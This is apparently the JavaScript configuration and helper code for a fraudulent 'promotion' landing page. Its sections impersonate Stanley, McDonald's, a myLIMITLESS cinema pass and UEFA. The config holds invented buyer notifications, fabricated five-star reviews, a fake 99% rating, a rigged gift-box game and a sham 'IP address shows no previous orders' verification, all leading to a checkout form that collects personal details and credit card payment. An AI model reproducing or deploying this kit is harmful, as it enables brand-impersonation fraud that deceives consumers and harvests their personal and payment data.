const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "gb";
  const lang = "en-GB";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Size: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    timer: "This week, you can only order one product at a promotional price.",
    text: `
  Congratulations!<br><br>
  You have participated in the Stanley promotion: you have the chance to purchase the STANLEY QUENCHER H2.0 thermos with an ice mold for only <b>£37</b>!
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "London, United Kingdom",
      action: "I just received the jewelry for £9.99!",
      timeago: "15 seconds ago",
    },
    {
      user: "Carlos B******",
      location: "Manchester, United Kingdom",
      action: "I just received the jewelry for £9.99!",
      timeago: "25 seconds ago",
    },
  ];

  const reviewsArr = [
    {
      name: "Emma J.:",
      time: "1 day ago",
      header: "This is amazing!",
      product: "26468781",
      review: "Unbelievable value! I got the 6-month myLIMITLESS PLUS pass at 90% off. Now I can watch as many films as I want without worrying about the cost!",
    },
    {
      name: "Liam S.:",
      time: "2 days ago",
      header: "Fantastic! I'm speechless.",
      product: "26468783",
      review: "The 3-month myLIMITLESS deal is amazing. With such a huge discount, it's practically free cinema for the entire summer. Highly recommend!",
    },
    {
      name: "Chloe R.:",
      time: "2 days ago",
      header: "Simply great.",
      product: "26468784",
      review: "Just grabbed the myLIMITLESS pass for half a year at a fraction of the price. Perfect timing for all the blockbuster releases!",
    },
    {
      name: "Sophia M.:",
      time: "4 days ago",
      header: "I love it",
      product: "26468781",
      review: "I never thought I'd get such a great deal on the myLIMITLESS PLUS pass. Six months of unlimited movies for just a few quid – incredible!",
    },
    {
      name: "James T.:",
      time: "7 days ago",
      header: "Wow, I love this product!",
      product: "26468782",
      review: "Best deal ever! 90% off the myLIMITLESS subscription means more movies and more savings. Couldn't be happier with this offer.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "REVIEWS AND RATINGS",
    percent: "99%",
    rec: "Comments on this promotion",
  };

  const questions = {
    _of: "Question {1} of {2}: ",
    arr: [
      {
        q: "Have you ever ordered McDonald's products?",
        a: [
          "Yes, I order often",
          "Yes, I order rarely",
          "I've never ordered",
        ],
      },
      {
        q: "Should McDonald's continue this type of advertising campaigns?",
        a: ["Yes, absolutely!", "Yes, but change the promotional menu", "No"],
      },
      {
        q: "Would you recommend our products to your friends?",
        a: ["Yes", "No"],
      },
    ],
  };

  const check = {
    title: "Your answer is being reviewed",
    arr: [
      "You answered question 3 out of 3",
      "Your IP address shows no previous orders",
      "Your answer has been verified",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Thank you for participating in the survey!",
        button: "Try your luck",
        text: `
<center>
    To receive the McDonald's promotional menu, you need to choose the right gift box.
    <br><br>
    You have 3 attempts, good luck!
</center>
            `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "Try again",
        text: `
<center>
    Unfortunately, this gift is empty. You have two more attempts, good luck!
</center>
            `,
      },
    },
    win: {
      texts: {
        header: "",
        button: "Place Order",
        text: `
<center>
    <p style="color: #ffffff"></p>
    <br>
    Click on the "Place Order" button, fill out the form, and pay for your order.
    <br>
    <br>
    Within 3–5 days, you will receive a package with your subscription card and instructions.
</center>
            `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Personal Information",
      fields: {
        name: {
          enabled: true,
          field: "First Name",
        },
        family: {
          enabled: true,
          field: "Last Name",
        },
        phone: {
          enabled: true,
          field: "Phone Number",
        },
        email: {
          enabled: true,
          field: "Email Address",
        },
      },
    },
    delivery: {
      title: "Delivery",
      fields: {
        city: {
          enabled: true,
          field: "City",
        },
        address: {
          enabled: true,
          field: "Delivery Address",
        },
        zip: {
          enabled: true,
          field: "Postal Code",
        },
      },
    },
    payment: {
      title: "Payment Methods",
      creditCard: "Online payment by credit card",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Order Details",
      oldPrice: "£96.00",
      newPrice: "£9.99",
      size: "Size",
      subTotal: {
        title: "Subtotal",
        amount: "£9.99",
      },
      deliveryTime: {
        title: "Delivery Time",
        amount: "3 days",
      },
      delivery: {
        title: "Delivery",
        amount: "£0.00",
      },
      total: {
        title: "Total",
        amount: "£9.99",
      },
      checkoutButton: "Pay your order",
    },
  };

  const products = [
    {
      id: "26468781",
      name: "MYLIMITLESS MEMBERSHIP - YOUR TICKET TO INFINITE CINEMA",
      miniImg: "./src/img/price.png",
      images: ["./src/img/price.png"],
    }
  ];

  const footer = {
    cr: "© 2024, UEFA and Fanatics, Inc.",
  };


  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

const siteKey = "cinepass-fr";

function setCookie(name, value, days = 2) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};


const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};


window.addEventListener("load", () => {
  starupCheck();
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  setCookie("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = getCookie("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => setCookie("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = getCookie("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => setCookie("__step", val);
const lsGetStep = () => {
  const step = getCookie("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});